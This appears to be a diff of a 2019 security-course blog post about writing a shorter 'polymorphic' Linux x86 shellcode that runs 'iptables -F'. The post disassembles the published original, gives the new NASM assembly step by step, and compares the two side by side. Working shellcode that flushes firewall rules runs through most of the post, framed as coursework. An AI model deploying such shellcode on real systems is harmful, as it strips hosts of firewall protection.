@@ -5,14 +5,15 @@ date:   2019-03-05
 categories: [SLAE, Assembly]
 ---
 The version that I created from this post was submitted to and accepted by exploit-db.com.  The URL is:
-https://www.exploit-db.com/shellcodes/46491
+[iptables -f shellcode](https://www.exploit-db.com/shellcodes/46491)
 
 
-The 2nd piece of shellcode we will try to create a polymorphic version of will be:\
-http://shell-storm.org/shellcode/files/shellcode-361.php
-The original length is 58 bytes, meaning we have up to 87 bytes (no more than 150%).
+The 2nd piece of shellcode we will try to create a polymorphic version of will be:
+[http://shell-storm.org/shellcode/files/shellcode-361.php](http://shell-storm.org/shellcode/files/shellcode-361.php)
 
-Let's take a look at the shellcode that is listed on shellstorm and lets put this through ndisasm just to be sure.
+The original length is 58 bytes, meaning we have up to 87 bytes maximum to fit in to the exam requirements (no more than 150%).
+
+Let's take a look at the original shellcode and put it through ndisasm just to be sure it does what it claims.
 ```
 jmp	short	callme
 main:
@@ -62,11 +63,12 @@ echo -ne '\xeb\x21\x5e\x31\xc0\x88\x46\x0e\x88\x46\x11\x89\x76\x12\x8d\x5e\x0f\x
 00000039  23                db 0x23
 
 ```
-We have a jump-call-pop to get the string we will be using. the #'s are replaced with nulls.  Looks like the strings are then copied to a location after the first string for the args struct as well.  Let's start working on a polymorphic version.
+There is a jump-call-pop to get the string that is used. The #'s are replaced with nulls.  It looks like the strings are then copied to a location after the first string for the args struct as well.  Let's start working on a polymorphic version.
 
-It looks like we can greatly reduce this shellcode if we get rid of the copying of the strings and just use our already saved reference.\
-We can jmp-call-pop into ebx to have our path to iptables already stored in the proper register.\
-Then we can 0 out edx with cdq and move a null byte into the # location.
+It looks like we can greatly reduce this shellcode if we get rid of all the mov's that copy the string to another location.  We can then just use our already saved reference to the string.
+
+We can use the same technique to store the iptables string in the proper register, jmp-call-pop into EBX.
+Then we can zero out EDX with cdq and move a null byte into the '#' location.
 ```nasm
 global _start
 
@@ -82,10 +84,12 @@ get:
   call code
   file: db "/sbin/iptables#-F"
 ```
-Next we set up our args struct.  The original shellcode copies the string to a location after the original string and sets it to ecx then uses an address of the already used null byte for edx.\
-We can just skip all these steps and use our original string and push the addresses to the stack, then move the stack pointer in to the ecx register.  Our edx is already 0'd out from earlier as well.\
-This is using the same strategy a normal stack based execve call would use.  Since we already have addresses stored in registers, it makes sense to do this and greatly reduces our shellcode length.\
-Also note that in the string variable above that we have removed the second '#'.  Our strategy pushes a null byte to the stack before the string address instead of replacing another '#' with a null.
+Next, we set up the args struct.  The original shellcode copies the string to a location after the original and loads its address to ECX.  It then loads the address of an already used NULL byte in to EDX.
+We can just skip all these steps and use our original string.  I will push the addresses to the stack, then move the stack pointer in to the ecx register.  Our edx is already 0'd out from earlier as well.
+
+This is using the same strategy that a normal stack based execve call would use combined with the jmp-call-pop string.  Since we already have addresses stored in registers, it makes sense to do this and greatly reduces our shellcode length.
+
+Also note that in the string variable "file" above, that we have removed the second '#'.  Our strategy pushes a null byte to the stack before the string address instead of replacing another '#' with a null.  Our code is currently as follows:
 ```nasm
 lea eax, [ebx+0xf]  ; get address of '-F'
 push edx            ; null terminate the struct
@@ -93,14 +97,15 @@ push eax            ; push -F
 push ebx            ; push /sbin/iptables
 mov ecx, esp        ; address stored as argument
 ```
-The last steps are to move 0xb into eax and interrupt (int 0x80).  We can use edx since it is null to mov into eax just for a little variation, then mov 0xb into al and make our call
+The last steps are to move 0xb into EAX and interrupt (int 0x80).  We can use EDX since it is already null to mov into EAX just for a little variation.  Then mov 0xb into AL and make our syscall.
 ```nasm
 mov eax, edx
 mov al, 0xb
 int 0x80
 ```
-Let's build it and run it.  Our objdump seems to be missing a few bytes in the string from /sbin/iptables.   I had to go in a manuall insert the sb from sbin and the a from iptables, then it was successful.\
-It has reduced the shellcode by 26%! Let's compare the shellcode side by side.
+Let's build it and run it.  The objdump seems to be missing a few bytes in the string from /sbin/iptables.   I had to go in a manually insert the 'sb' from sbin and the 'a' from iptables, then it worked as expected.  This may have been an issue with the objdump command that was provided in the video.  It was mentioned that one of the cut command options can cause problems if the dump has large combinations of opcodes in 1 line.  I went ahead and inserted the bytes on my own but may go back to see if changing the command a bit will get it to work at another time.
+
+The final product has reduced the shellcode by 26%! Let's compare the shellcode side by side.
 ```nasm
 jmp short 0x23                                jmp short 0x15
 pop esi                                       pop ebx
@@ -127,3 +132,5 @@ db 0x2d                                       db 0x2d
 inc esi                                       inc esi
 db 0x23
 ```
+
+With the big reduction in size, I decided to check on exploit-db for any similar shellcode or of similar length.  It turns out that there is only 1 other shellcode that was on there with the same length (none shorter).  The already published shellcode uses a full stack approach so I submitted the shellcode in the hopes that it will get accepted, which it did!  The link is above at the top of this post.
